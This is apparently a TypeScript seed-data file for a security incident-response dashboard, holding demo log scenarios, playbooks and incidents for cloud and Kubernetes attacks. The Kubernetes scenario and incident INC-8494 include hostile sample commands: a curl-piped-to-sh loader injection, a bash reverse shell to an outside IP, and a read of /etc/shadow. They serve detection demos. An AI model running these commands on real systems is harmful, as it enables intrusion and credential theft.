/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { Incident, Playbook, Asset, AuditEntry, DetectionRule } from '../types';
import { DEFAULT_DETECTION_RULES } from './rulesEngine';

export interface DemoScenario {
  id: string;
  title: string;
  category: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  description: string;
  logFormat: 'AWS CloudTrail' | 'Okta / Auth0 JSON' | 'Kubernetes Audit' | 'DevOps CI/CD';
  rawLogs: string;
}

export const DEMO_SCENARIOS: DemoScenario[] = [
  {
    id: 'SCENARIO-AWS-EXFIL',
    title: 'AWS CloudTrail: Leaked IAM Key & S3 Financial Exfiltration',
    category: 'Cloud Storage & Identity',
    severity: 'CRITICAL',
    description: 'An attacker uses a compromised developer access key from an anomalous Tor exit IP to escalate privileges and exfiltrate customer finance spreadsheets from an S3 bucket.',
    logFormat: 'AWS CloudTrail',
    rawLogs: `{
  "Records": [
    {
      "eventVersion": "1.08",
      "userIdentity": {
        "type": "IAMUser",
        "principalId": "AIDA2EXAMPLEDEVELOPER",
        "arn": "arn:aws:iam::123456789012:user/dev-jdoe",
        "accountId": "123456789012",
        "userName": "dev-jdoe"
      },
      "eventTime": "2026-10-18T00:15:22Z",
      "eventSource": "iam.amazonaws.com",
      "eventName": "CreateAccessKey",
      "awsRegion": "us-east-1",
      "sourceIPAddress": "185.220.101.5",
      "userAgent": "aws-cli/2.15.15 Python/3.11.6 Linux/x86_64",
      "requestParameters": {
        "userName": "dev-jdoe"
      },
      "responseElements": {
        "accessKey": {
          "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
          "status": "Active"
        }
      }
    },
    {
      "eventVersion": "1.08",
      "userIdentity": {
        "type": "IAMUser",
        "principalId": "AIDA2EXAMPLEDEVELOPER",
        "arn": "arn:aws:iam::123456789012:user/dev-jdoe",
        "userName": "dev-jdoe"
      },
      "eventTime": "2026-10-18T00:16:04Z",
      "eventSource": "iam.amazonaws.com",
      "eventName": "AttachUserPolicy",
      "awsRegion": "us-east-1",
      "sourceIPAddress": "185.220.101.5",
      "userAgent": "aws-cli/2.15.15 Python/3.11.6 Linux/x86_64",
      "requestParameters": {
        "userName": "dev-jdoe",
        "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
      }
    },
    {
      "eventVersion": "1.08",
      "userIdentity": {
        "type": "IAMUser",
        "userName": "dev-jdoe"
      },
      "eventTime": "2026-10-18T00:17:45Z",
      "eventSource": "s3.amazonaws.com",
      "eventName": "PutBucketPolicy",
      "awsRegion": "us-east-1",
      "sourceIPAddress": "185.220.101.5",
      "userAgent": "aws-cli/2.15.15 Python/3.11.6 Linux/x86_64",
      "requestParameters": {
        "bucketName": "enterprise-customer-finance-vault-prod",
        "bucketPolicy": "{\\"Version\\":\\"2012-10-17\\",\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":\\"*\\",\\"Action\\":\\"s3:GetObject\\",\\"Resource\\":\\"arn:aws:s3:::enterprise-customer-finance-vault-prod/*\\"}]}"
      }
    },
    {
      "eventVersion": "1.08",
      "userIdentity": {
        "type": "IAMUser",
        "userName": "dev-jdoe"
      },
      "eventTime": "2026-10-18T00:19:10Z",
      "eventSource": "s3.amazonaws.com",
      "eventName": "GetObject_Bulk",
      "awsRegion": "us-east-1",
      "sourceIPAddress": "185.220.101.5",
      "userAgent": "rclone/v1.64.0",
      "requestParameters": {
        "bucketName": "enterprise-customer-finance-vault-prod",
        "keyPrefix": "q4_payroll_records/"
      }
    }
  ]
}`
  },
  {
    id: 'SCENARIO-OKTA-TRAVEL',
    title: 'Okta / ZTNA: Impossible Travel & Credential Stuffing',
    category: 'Identity Access',
    severity: 'HIGH',
    description: 'User successfully logs in from New York, then 12 minutes later initiates an administrative console login from an IP in Eastern Europe with no MFA push challenged.',
    logFormat: 'Okta / Auth0 JSON',
    rawLogs: `[
  {
    "timestamp": "2026-10-18T00:02:11Z",
    "source_ip": "198.51.100.24",
    "location": "New York, USA",
    "user": "sarah.connor@enterprise.io",
    "service": "Okta SSO",
    "action": "user.authentication.verify",
    "status": "SUCCESS",
    "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0"
  },
  {
    "timestamp": "2026-10-18T00:14:48Z",
    "source_ip": "91.240.118.99",
    "location": "Bucharest, Romania",
    "user": "sarah.connor@enterprise.io",
    "service": "Okta SSO",
    "action": "user.session.impersonate",
    "status": "SUCCESS",
    "userAgent": "python-requests/2.31.0"
  },
  {
    "timestamp": "2026-10-18T00:15:30Z",
    "source_ip": "91.240.118.99",
    "location": "Bucharest, Romania",
    "user": "sarah.connor@enterprise.io",
    "service": "AWS Identity Center",
    "action": "FederateToAdministratorAccess",
    "status": "SUCCESS",
    "userAgent": "python-requests/2.31.0"
  }
]`
  },
  {
    id: 'SCENARIO-K8S-RCE',
    title: 'Kubernetes: Pod Exec Injection & Reverse Shell',
    category: 'Workload & Execution',
    severity: 'CRITICAL',
    description: 'Exploitation of a publicly exposed API Gateway container followed by /bin/sh interactive execution and connection to an external command-and-control IP.',
    logFormat: 'Kubernetes Audit',
    rawLogs: `2026-10-18T00:10:05Z host=k8s-worker-node-04 app=ingress-nginx client=194.26.29.112 method=POST uri="/api/v1/payment/checkout" status=500 user="anonymous" payload="'; curl -s http://194.26.29.112/loader.sh | sh; #'"
2026-10-18T00:10:08Z host=k8s-worker-node-04 namespace=production pod=payment-svc-78bd9c-f4k2a container=api user="root" action=COMMAND_EXECUTION command="bash -i >& /dev/tcp/194.26.29.112/4444 0>&1" status=SUCCESS
2026-10-18T00:10:14Z host=k8s-worker-node-04 namespace=production pod=payment-svc-78bd9c-f4k2a container=api user="root" action=SUDO_EXECUTION command="sudo cat /etc/shadow" status=SUCCESS`
  },
  {
    id: 'SCENARIO-BENIGN-CICD',
    title: 'Benign Telemetry: Automated CI/CD Nightly Microservice Deploy',
    category: 'Benign Operational Activity',
    severity: 'LOW',
    description: 'Scheduled GitHub Actions runner executing Docker image pushes and ECS service redeployment. Demonstrates false positive filtering and low risk scores.',
    logFormat: 'DevOps CI/CD',
    rawLogs: `timestamp,source_ip,user,service,action,status,resource
2026-10-18T00:00:01Z,140.82.112.4,github-actions-bot,aws.ecr,GetAuthorizationToken,SUCCESS,arn:aws:ecr:us-east-1:123456789012:repository/billing-engine
2026-10-18T00:00:15Z,140.82.112.4,github-actions-bot,aws.ecr,PutImage,SUCCESS,billing-engine:v2.4.12
2026-10-18T00:00:30Z,140.82.112.4,github-actions-bot,aws.ecs,UpdateService,SUCCESS,arn:aws:ecs:us-east-1:123456789012:service/billing-cluster/billing-prod`
  }
];

export const INITIAL_ASSETS: Asset[] = [
  {
    id: 'AST-S3-01',
    name: 'enterprise-customer-finance-vault-prod',
    type: 'S3',
    arnOrId: 'arn:aws:s3:::enterprise-customer-finance-vault-prod',
    region: 'us-east-1',
    criticality: 'CRITICAL',
    status: 'COMPROMISED_SUSPECT',
    associatedIncidents: ['INC-8492'],
    owner: 'treasury-secops@enterprise.internal',
    tags: { Classification: 'PII/Restricted', Environment: 'Production', Compliance: 'PCI-DSS' }
  },
  {
    id: 'AST-IAM-02',
    name: 'dev-jdoe (Developer Account)',
    type: 'IAM_ROLE',
    arnOrId: 'arn:aws:iam::123456789012:user/dev-jdoe',
    region: 'global',
    criticality: 'HIGH',
    status: 'ISOLATED',
    associatedIncidents: ['INC-8492'],
    owner: 'engineering-leads@enterprise.internal',
    tags: { Department: 'Platform Engineering', Role: 'Developer' }
  },
  {
    id: 'AST-K8S-03',
    name: 'production-payment-cluster',
    type: 'KUBERNETES',
    arnOrId: 'arn:aws:eks:us-east-1:123456789012:cluster/prod-payment',
    region: 'us-east-1',
    criticality: 'CRITICAL',
    status: 'INVESTIGATING',
    associatedIncidents: ['INC-8494'],
    owner: 'sre-oncall@enterprise.internal',
    ipAddress: '10.0.4.12',
    tags: { Environment: 'Production', Scope: 'Cardholder Data' }
  },
  {
    id: 'AST-RDS-04',
    name: 'aurora-pg-customer-ledger',
    type: 'RDS',
    arnOrId: 'arn:aws:rds:us-east-1:123456789012:db:aurora-pg-ledger',
    region: 'us-east-1',
    criticality: 'CRITICAL',
    status: 'HEALTHY',
    associatedIncidents: [],
    owner: 'database-admins@enterprise.internal',
    ipAddress: '10.0.12.88',
    tags: { Encryption: 'KMS-CMK', Backup: 'Continuous' }
  },
  {
    id: 'AST-APIGW-05',
    name: 'enterprise-public-gateway',
    type: 'API_GATEWAY',
    arnOrId: 'arn:aws:apigateway:us-east-1::/restapis/v78x92a',
    region: 'us-east-1',
    criticality: 'HIGH',
    status: 'HEALTHY',
    associatedIncidents: ['INC-8494'],
    owner: 'network-ops@enterprise.internal',
    tags: { WAF: 'Enabled', RateLimit: '5000rps' }
  }
];

export const INITIAL_PLAYBOOKS: Playbook[] = [
  {
    id: 'PB-IAM-01',
    name: 'Emergency IAM Credential Revocation & Session Termination',
    description: 'Inactivates compromised AWS access keys, detaches unauthorized administrative policies, and revokes active STS console sessions.',
    category: 'IDENTITY',
    targetThreat: 'Compromised Access Keys & Unauthorized Privilege Escalation',
    riskReductionEstimate: 75,
    requiresApproval: true,
    status: 'READY',
    steps: [
      {
        id: 'STEP-1',
        name: 'Inactivate Suspicious IAM Access Key',
        actionType: 'AWS_IAM',
        description: 'Immediately disables API access for the targeted access key ID to stop programmatic attacks.',
        commandPreview: 'aws iam update-access-key --user-name dev-jdoe --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive',
        rollbackCommand: 'aws iam update-access-key --user-name dev-jdoe --access-key-id AKIAIOSFODNN7EXAMPLE --status Active',
        status: 'PENDING'
      },
      {
        id: 'STEP-2',
        name: 'Revoke Active Console & STS Sessions',
        actionType: 'AWS_IAM',
        description: 'Attaches an inline deny policy with sts:AssumedRole session timestamp invalidate.',
        commandPreview: 'aws iam put-user-policy --user-name dev-jdoe --policy-name RevokeOlderSessions --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*","Condition":{"DateLessThan":{"aws:TokenIssueTime":"2026-10-18T00:30:00Z"}}}]}\'',
        status: 'PENDING'
      },
      {
        id: 'STEP-3',
        name: 'Detach Attached AdministratorAccess Policy',
        actionType: 'AWS_IAM',
        description: 'Removes elevated wildcard permissions added by the attacker.',
        commandPreview: 'aws iam detach-user-policy --user-name dev-jdoe --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
        status: 'PENDING'
      },
      {
        id: 'STEP-4',
        name: 'Post Incident Notification to Security Lead',
        actionType: 'NOTIFICATION',
        description: 'Sends secure automated notification to Slack #soc-incidents and PagerDuty.',
        commandPreview: 'aws sns publish --topic-arn arn:aws:sns:us-east-1:123456789012:AegisAlerts --message "Compromised credential dev-jdoe contained via AEGIS PB-IAM-01"',
        status: 'PENDING'
      }
    ]
  },
  {
    id: 'PB-NET-02',
    name: 'AWS WAF & Security Group Perimeter IP Quarantine',
    description: 'Blocks malicious reconnaissance or exfiltration source IPs across all public Application Load Balancers and CloudFront distributions.',
    category: 'NETWORK',
    targetThreat: 'Brute Force, C2 Communication & Distributed Scans',
    riskReductionEstimate: 60,
    requiresApproval: true,
    status: 'READY',
    steps: [
      {
        id: 'STEP-1',
        name: 'Insert IP into Global WAF BlockSet',
        actionType: 'AWS_WAF',
        description: 'Adds offending CIDR /32 address to regional AWS WAF IPSet rule with 403 Forbidden action.',
        commandPreview: 'aws wafv2 update-ip-set --name AegisBlockList --scope REGIONAL --id 998a-11bc --addresses 185.220.101.5/32 194.26.29.112/32',
        status: 'PENDING'
      },
      {
        id: 'STEP-2',
        name: 'Drop State on Edge VPC Flow Routers',
        actionType: 'AWS_WAF',
        description: 'Flushes existing TCP state tables for offending IP to instantly terminate inflight socket connections.',
        commandPreview: 'aws ec2 create-network-acl-entry --network-acl-id acl-09af82 --rule-number 50 --protocol -1 --rule-action deny --cidr-block 185.220.101.5/32 --ingress',
        status: 'PENDING'
      }
    ]
  },
  {
    id: 'PB-S3-03',
    name: 'S3 Public Exposure Remediation & Bucket Lockdown',
    description: 'Restores S3 Block Public Access settings and strips wildcard public read policies.',
    category: 'CLOUD_STORAGE',
    targetThreat: 'Public S3 Data Exposure & Unauthorized Exfiltration',
    riskReductionEstimate: 85,
    requiresApproval: true,
    status: 'READY',
    steps: [
      {
        id: 'STEP-1',
        name: 'Apply S3 Block Public Access Setting',
        actionType: 'AWS_S3',
        description: 'Forces BlockPublicAcls, IgnorePublicAcls, BlockPublicPolicy, and RestrictPublicBuckets to true.',
        commandPreview: 'aws s3api put-public-access-block --bucket enterprise-customer-finance-vault-prod --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"',
        status: 'PENDING'
      },
      {
        id: 'STEP-2',
        name: 'Delete Unauthorized Public Policy',
        actionType: 'AWS_S3',
        description: 'Deletes the bucket policy allowing unauthenticated external access.',
        commandPreview: 'aws s3api delete-bucket-policy --bucket enterprise-customer-finance-vault-prod',
        status: 'PENDING'
      }
    ]
  },
  {
    id: 'PB-HOST-04',
    name: 'Compromised Workload Quarantine & Forensic Snapshot',
    description: 'Moves infected EC2 instance or Kubernetes pod into isolated security group and triggers EBS forensic volume snapshot.',
    category: 'ENDPOINT',
    targetThreat: 'Active Web Shell, Reverse Shell & Container Breakout',
    riskReductionEstimate: 80,
    requiresApproval: true,
    status: 'READY',
    steps: [
      {
        id: 'STEP-1',
        name: 'Snapshot EBS Storage Volumes',
        actionType: 'FORENSICS',
        description: 'Preserves disk state without altering memory footprint.',
        commandPreview: 'aws ec2 create-snapshot --volume-id vol-0a91fbc82 --description "AEGIS Forensic Snapshot for Incident INC-8494"',
        status: 'PENDING'
      },
      {
        id: 'STEP-2',
        name: 'Switch Security Group to Quarantine Isolated SG',
        actionType: 'AWS_EC2',
        description: 'Applies zero-ingress, zero-egress security group allowing only internal forensic agent access.',
        commandPreview: 'aws ec2 modify-instance-attribute --instance-id i-082bcfa71 --groups sg-quarantine-isolated-secops',
        status: 'PENDING'
      }
    ]
  }
];

export const INITIAL_INCIDENTS: Incident[] = [
  {
    id: 'INC-8492',
    title: 'CloudTrail IAM Key Exfiltration & S3 Finance Vault Access',
    severity: 'CRITICAL',
    status: 'CONTAINING',
    createdAt: '2026-10-18T00:15:22Z',
    updatedAt: '2026-10-18T00:25:00Z',
    assignedTo: 'Alex Vance (Lead SecOps)',
    description: 'Compromised IAM credential dev-jdoe used from anomalous Tor exit IP (185.220.101.5) to attach AdministratorAccess policy and query enterprise-customer-finance-vault-prod.',
    threatCategory: 'Cloud Storage Exfiltration & Public Bucket Exposure',
    riskScore: 92,
    confidence: 96,
    mitreTactics: [
      { tactic: 'Initial Access', techniqueId: 'T1078.004', techniqueName: 'Valid Accounts: Cloud Accounts' },
      { tactic: 'Privilege Escalation', techniqueId: 'T1098', techniqueName: 'Account Manipulation' },
      { tactic: 'Exfiltration', techniqueId: 'T1530', techniqueName: 'Data from Cloud Storage Object' }
    ],
    affectedAssets: ['enterprise-customer-finance-vault-prod', 'dev-jdoe (Developer Account)'],
    events: [
      {
        id: 'EV-8492-1',
        timestamp: '2026-10-18T00:15:22Z',
        sourceIp: '185.220.101.5',
        user: 'dev-jdoe',
        service: 'iam.amazonaws.com',
        action: 'CreateAccessKey',
        status: 'SUCCESS',
        userAgent: 'aws-cli/2.15.15',
        resource: 'dev-jdoe',
        rawLog: 'CreateAccessKey invoked from unknown IP 185.220.101.5',
        severity: 'HIGH',
        riskScore: 78
      },
      {
        id: 'EV-8492-2',
        timestamp: '2026-10-18T00:16:04Z',
        sourceIp: '185.220.101.5',
        user: 'dev-jdoe',
        service: 'iam.amazonaws.com',
        action: 'AttachUserPolicy',
        status: 'SUCCESS',
        userAgent: 'aws-cli/2.15.15',
        resource: 'arn:aws:iam::aws:policy/AdministratorAccess',
        rawLog: 'AttachUserPolicy AdministratorAccess granted to dev-jdoe',
        severity: 'CRITICAL',
        riskScore: 94
      },
      {
        id: 'EV-8492-3',
        timestamp: '2026-10-18T00:17:45Z',
        sourceIp: '185.220.101.5',
        user: 'dev-jdoe',
        service: 's3.amazonaws.com',
        action: 'PutBucketPolicy',
        status: 'SUCCESS',
        userAgent: 'aws-cli/2.15.15',
        resource: 'enterprise-customer-finance-vault-prod',
        rawLog: 'PutBucketPolicy: Principal * allowed read on vault',
        severity: 'CRITICAL',
        riskScore: 98
      }
    ],
    notes: [
      {
        id: 'NOTE-1',
        author: 'Alex Vance',
        timestamp: '2026-10-18T00:22:00Z',
        content: 'Contacted user John Doe via Slack out-of-band. User confirmed they did not issue any AWS CLI commands today and are asleep in California. Marked as confirmed credential theft.'
      },
      {
        id: 'NOTE-2',
        author: 'AEGIS System',
        timestamp: '2026-10-18T00:24:30Z',
        content: 'Automated Playbook PB-IAM-01 dry-run proposal generated. Awaiting human confirmation to inactivate key AKIAIOSFODNN7EXAMPLE.'
      }
    ],
    auditHistory: [
      {
        id: 'AUD-01',
        timestamp: '2026-10-18T00:16:10Z',
        user: 'AEGIS Detection Engine',
        action: 'INCIDENT_CREATED',
        details: 'Triggered by Rule R-103 and R-104. Assigned initial risk score 92.'
      },
      {
        id: 'AUD-02',
        timestamp: '2026-10-18T00:20:00Z',
        user: 'Alex Vance',
        action: 'STATUS_TRANSITION',
        details: 'Changed status from OPEN to CONTAINING.'
      }
    ],
    appliedPlaybooks: ['PB-IAM-01 (Dry-Run Approved)'],
    tags: ['CloudTrail', 'CredentialCompromise', 'S3Exfil', 'P0-Critical'],
    summary: 'Confirmed credential compromise resulting in unauthorized AdministratorAccess grant and public bucket policy application. Containment active.',
    remediationChecklist: [
      {
        id: 'R-1',
        step: 'Revoke active IAM user session tokens and inactivate key AKIAIOSFODNN7EXAMPLE',
        priority: 'IMMEDIATE',
        playbookId: 'PB-IAM-01',
        automatedAvailable: true
      },
      {
        id: 'R-2',
        step: 'Apply S3 Block Public Access to customer finance vault',
        priority: 'IMMEDIATE',
        playbookId: 'PB-S3-03',
        automatedAvailable: true
      }
    ]
  },
  {
    id: 'INC-8493',
    title: 'Okta Impossible Travel Anomaly Across US and Europe',
    severity: 'HIGH',
    status: 'ACKNOWLEDGED',
    createdAt: '2026-10-18T00:14:48Z',
    updatedAt: '2026-10-18T00:18:00Z',
    assignedTo: 'Maria Chen (Identity Analyst)',
    description: 'Concurrent user sessions established from New York (198.51.100.24) and Bucharest (91.240.118.99) within 12 minutes delta.',
    threatCategory: 'Anomalous Cloud Session & Impossible Travel Anomaly',
    riskScore: 74,
    confidence: 89,
    mitreTactics: [
      { tactic: 'Initial Access', techniqueId: 'T1078.004', techniqueName: 'Valid Accounts: Cloud Accounts' }
    ],
    affectedAssets: ['AST-IAM-02'],
    events: [
      {
        id: 'EV-8493-1',
        timestamp: '2026-10-18T00:02:11Z',
        sourceIp: '198.51.100.24',
        user: 'sarah.connor@enterprise.io',
        service: 'Okta SSO',
        action: 'user.authentication.verify',
        status: 'SUCCESS',
        location: 'New York, USA',
        rawLog: 'Legitimate login verify from corporate IP',
        severity: 'LOW',
        riskScore: 15
      },
      {
        id: 'EV-8493-2',
        timestamp: '2026-10-18T00:14:48Z',
        sourceIp: '91.240.118.99',
        user: 'sarah.connor@enterprise.io',
        service: 'Okta SSO',
        action: 'user.session.impersonate',
        status: 'SUCCESS',
        location: 'Bucharest, Romania',
        rawLog: 'Session token replay with python-requests user agent',
        severity: 'HIGH',
        riskScore: 78
      }
    ],
    notes: [
      {
        id: 'NOTE-1',
        author: 'Maria Chen',
        timestamp: '2026-10-18T00:18:00Z',
        content: 'Reviewing Okta system logs. Python-requests user agent strongly indicates stolen session cookie or automated token scraping.'
      }
    ],
    auditHistory: [
      {
        id: 'AUD-01',
        timestamp: '2026-10-18T00:15:00Z',
        user: 'AEGIS Detection Engine',
        action: 'INCIDENT_CREATED',
        details: 'Triggered by Rule R-101. Risk score 74.'
      }
    ],
    appliedPlaybooks: [],
    tags: ['Okta', 'ImpossibleTravel', 'SessionTheft'],
    summary: 'Impossible geographical travel anomaly detected between New York and Bucharest. Awaiting analyst credential reset.',
    remediationChecklist: [
      {
        id: 'R-1',
        step: 'Force logout all active Okta sessions for sarah.connor@enterprise.io',
        priority: 'IMMEDIATE',
        playbookId: 'PB-IAM-01',
        automatedAvailable: true
      }
    ]
  },
  {
    id: 'INC-8494',
    title: 'Kubernetes API Ingress Injection & Interactive Reverse Shell',
    severity: 'CRITICAL',
    status: 'OPEN',
    createdAt: '2026-10-18T00:10:05Z',
    updatedAt: '2026-10-18T00:12:00Z',
    assignedTo: 'Unassigned',
    description: 'Inbound POST injection exploit on production payment gateway spawned /bin/sh reverse TCP connection to 194.26.29.112:4444.',
    threatCategory: 'Remote Code Execution & Reverse Interactive Shell',
    riskScore: 96,
    confidence: 98,
    mitreTactics: [
      { tactic: 'Execution', techniqueId: 'T1059.004', techniqueName: 'Command and Scripting: Unix Shell' },
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' }
    ],
    affectedAssets: ['production-payment-cluster', 'enterprise-public-gateway'],
    events: [
      {
        id: 'EV-8494-1',
        timestamp: '2026-10-18T00:10:05Z',
        sourceIp: '194.26.29.112',
        user: 'anonymous',
        service: 'ingress-nginx',
        action: 'HTTP_POST_INJECTION',
        status: 'FAILURE',
        rawLog: 'Injection probe: "; curl -s http://194.26.29.112/loader.sh | sh; #"',
        severity: 'HIGH',
        riskScore: 82
      },
      {
        id: 'EV-8494-2',
        timestamp: '2026-10-18T00:10:08Z',
        sourceIp: '194.26.29.112',
        user: 'root',
        service: 'payment-svc',
        action: 'COMMAND_EXECUTION',
        status: 'SUCCESS',
        rawLog: 'bash -i >& /dev/tcp/194.26.29.112/4444 0>&1',
        severity: 'CRITICAL',
        riskScore: 98
      }
    ],
    notes: [],
    auditHistory: [
      {
        id: 'AUD-01',
        timestamp: '2026-10-18T00:10:10Z',
        user: 'AEGIS Detection Engine',
        action: 'INCIDENT_CREATED',
        details: 'Critical reverse shell signature matched. Alert dispatched.'
      }
    ],
    appliedPlaybooks: [],
    tags: ['Kubernetes', 'RCE', 'ReverseShell', 'P0-Critical'],
    summary: 'Active reverse shell detected inside payment service container. Urgent host isolation required.',
    remediationChecklist: [
      {
        id: 'R-1',
        step: 'Quarantine payment pod and create EBS forensic snapshot',
        priority: 'IMMEDIATE',
        playbookId: 'PB-HOST-04',
        automatedAvailable: true
      },
      {
        id: 'R-2',
        step: 'Block C2 IP 194.26.29.112 at perimeter WAF',
        priority: 'IMMEDIATE',
        playbookId: 'PB-NET-02',
        automatedAvailable: true
      }
    ]
  }
];

export const INITIAL_AUDIT_LOGS: AuditEntry[] = [
  {
    id: 'AUD-LOG-100',
    timestamp: '2026-10-18T00:24:30Z',
    user: 'Alex Vance',
    category: 'PLAYBOOK',
    action: 'DRY_RUN_EXECUTE',
    target: 'PB-IAM-01',
    result: 'SUCCESS',
    details: 'Simulated revocation of access key AKIAIOSFODNN7EXAMPLE. 4 steps verified.'
  },
  {
    id: 'AUD-LOG-099',
    timestamp: '2026-10-18T00:20:00Z',
    user: 'Alex Vance',
    category: 'INCIDENT',
    action: 'STATUS_UPDATE',
    target: 'INC-8492',
    result: 'SUCCESS',
    details: 'Transitioned incident state OPEN -> CONTAINING with note attached.'
  },
  {
    id: 'AUD-LOG-098',
    timestamp: '2026-10-18T00:16:10Z',
    user: 'AEGIS Engine',
    category: 'INCIDENT',
    action: 'AUTO_DETECT',
    target: 'INC-8492',
    result: 'SUCCESS',
    details: 'Correlation engine opened incident INC-8492 from 3 matched CloudTrail events.'
  },
  {
    id: 'AUD-LOG-097',
    timestamp: '2026-10-18T00:12:00Z',
    user: 'Maria Chen',
    category: 'RULE',
    action: 'RULE_TUNE',
    target: 'R-101',
    result: 'SUCCESS',
    details: 'Updated impossible travel threshold window to 60 minutes.'
  },
  {
    id: 'AUD-LOG-096',
    timestamp: '2026-10-18T00:05:00Z',
    user: 'System Admin',
    category: 'SYSTEM',
    action: 'HEALTH_CHECK',
    target: 'AEGIS Core Server',
    result: 'SUCCESS',
    details: 'Provider diagnostics validated: Gemini-3.8-Flash active, fallback standby ready.'
  }
];
